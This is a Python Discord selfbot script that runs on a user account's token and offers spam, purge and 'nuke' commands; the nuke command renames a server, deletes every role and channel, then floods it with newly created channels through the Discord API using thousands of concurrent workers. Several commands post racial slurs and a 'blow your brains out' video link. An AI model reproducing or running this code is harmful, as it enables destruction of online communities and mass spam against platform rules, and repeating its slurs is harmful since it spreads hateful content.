import os
import asyncio
import discord
import requests
import threading
import random
import httpx
from tasksio import TaskPool
from discord.ext import commands

os.system('pip install discord==1.7.3 discord.py==1.7.3 requests httpx tasksio TaskPool asyncio')

channel_names = ["dreamybullxxx", "cum"]
token = input(f'token:')
status = input(f'status:')
prefix = input(f'prefix:')
headers = {'Authorization': token}
thugz = commands.Bot(command_prefix=prefix, self_bot=True, help_command=None)


# you can do Watching or Streaming or Game or Activity for the ActivityType by changing playing for any of those 4
@thugz.event
async def on_connect():
    await thugz.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f'{status}'))


async def channelspam(name, session):
    while True:
        s = await session.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers,
                               json={'type': '0', 'name': name})
        print(s.status_code)
        if s.status_code == 429:
            await asyncio.sleep(s.json()['retry_after'])
        else:
            break

@thugz.command()
async def bruh(ctx):
        await ctx.message.delete()
        for _i in range(1):
            await ctx.send(
                "https://cdn.discordapp.com/attachments/1015462485488320533/1018580184959561900/IMG_3240.png")

@thugz.command()
async def help(ctx):
    await ctx.message.delete()
    for _i in range(1):
        await ctx.send("CAAF Selfbot - Made by ReadKampf & GAF: Help - Shows lists of commands | Purge - Deletes all messages in a guild | Spam - Spams a message and the amount requested | Bruh - Posts Nigga Cringing | Brains - Posts Mindblowing Stuff | Hi - Posts a funny | Nuke - Nukes the server | https://cdn.discordapp.com/attachments/1015462485488320533/1018225859477385329/higuyz.png")

@thugz.command()
async def brains(ctx):
    await ctx.message.delete()
    for _i in range(1):
        await ctx.send(
            "https://cdn.discordapp.com/attachments/1014271200748384287/1018581338334433351/Blow_your_brains_out.mp4 https://cdn.discordapp.com/attachments/1014271200748384287/1018581267240988783/Nigger_brains.MP4")


# command by GAF
@thugz.command()
async def purge(ctx):
    await ctx.message.delete()
    amount = 9999
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == thugz.user).map(
               lambda m: m):
        await asyncio.gather(*[message.delete()])

@thugz.command()
async def spam(ctx, amount: int, *, msg):
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(msg)

@thugz.command()
async def hi(ctx):
    await ctx.message.delete()
    for _i in range(1):
        await ctx.send(
            "https://cdn.discordapp.com/attachments/1015462485488320533/1017269262118821889/IMG_8041.gif https://cdn.discordapp.com/attachments/1015462485488320533/1017269262542438441/IMG_7807.gif")

# command by GAF
@thugz.command()
async def nuke(ctx, amount: int):
    guild2 = ctx.guild
    await ctx.guild.edit(name="IM CUMMING OH SHIT")
    for role in guild2.roles:
        try:
            await asyncio.gather(*[role.delete() for role in guild2.roles])
        except:
            pass
    for channel in guild2.channels:
        try:
            await asyncio.gather(*[channel.delete() for channel in guild2.channels])
        except:
            pass
    global guild
    guild = ctx.guild.id
    async with httpx.AsyncClient() as session:
        async with TaskPool(workers=6000) as tasks:
            for _i in range(int(amount)):
                await tasks.put(channelspam(random.choice(channel_names), session))

thugz.run(token, bot=False)

# Made By 🇷🇺[CAAF]🇷🇺 Kolum『♤』✞☠✞[ц1]#1547 With Help From gaf#4646
